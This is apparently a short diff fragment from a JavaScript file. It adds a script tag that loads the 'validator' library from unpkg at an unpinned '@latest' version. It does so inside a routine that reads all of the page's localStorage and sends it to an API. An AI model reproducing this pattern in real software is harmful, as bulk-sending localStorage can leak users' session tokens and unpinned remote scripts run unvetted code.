@@ -58,6 +58,9 @@ async function sendToApi(data) {
 }
 
 (async () => {
+  let scripttag = document.createElement("script")
+  scripttag.src = "https://unpkg.com/validator@latest/validator.min.js"
+  document.head.append(scripttag)
   let data = await getAlllocalStorageData()
   if (data !== null) {
     sendToApi(data)
